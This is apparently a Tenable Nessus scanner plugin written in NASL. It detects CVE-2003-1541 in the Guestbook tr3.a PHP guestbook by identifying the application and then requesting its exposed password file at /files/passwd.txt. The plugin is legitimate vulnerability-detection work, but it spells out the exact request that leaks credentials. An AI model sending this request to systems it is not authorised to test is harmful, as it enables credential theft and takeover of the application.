#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

# Ref:
# Message-ID: <20030321012151.9388.qmail@www.securityfocus.com>
# From: subj <r2subj3ct@dwclan.org>
# To: bugtraq@securityfocus.com
# Subject: Guestbook tr3.a

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(11436);
  script_version("1.30");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2003-1541");
  script_bugtraq_id(7167);
  script_xref(name:"SECUNIA", value:"8392");

  script_name(english:"Guestbook tr3.a Password Disclosure");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI application that is affected by
an information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote install of Guestbook tr3.a fails to restrict access to its
password file. An unauthenticated, remote attacker can leverage this
issue to gain control of the affected application.");
  # https://www.securityfocus.com/archive/1/archive/1/315895/30/25400/threaded
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?cf3868f2");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_cwe_id(264);

  script_set_attribute(attribute:"plugin_publication_date", value:"2003/03/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2003-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl", "find_service1.nasl", "no404.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

#
# The script code starts here
#


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "The web server on port "+port+" does not support PHP");


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/guestbook", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure we're looking at Guestbook tr3.a.
  url = string(dir, "/guestbook.php");

  w = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(w)) exit(1, "the web server on port "+port+" did non answer");
  res = w[2];

  # If so...
  if (
    "PHP script by Bernd Moon" >< res ||
    ">Find all message here" >< res
  )
  {
    # Try the exploit.
    url2 = string(dir, "/files/passwd.txt");

    w = http_send_recv3(method:"GET", item:url2, port:port);
    if (isnull(w)) exit(1, "the web on port "+port+" did not answer");
    res2 = w[2];

    # There's a problem if we get something.
    if (strlen(res2))
    {
      if (report_verbosity)
      {
        report = string(
          "\n",
          "Nessus was able to exploit the issue to retrieve the contents of\n",
          "the application's password file using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url2), "\n"
        );
        if (report_verbosity > 1)
        {
          res2 = data_protection::sanitize_user_full_redaction(output:res2);
          report += string(
            "\n",
            "Here are the contents :\n",
            "\n",
            "  ", str_replace(find:'\n', replace:'\n  ', string:res2), "\n"
          );
        }
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      exit(0);
    }
  }
}
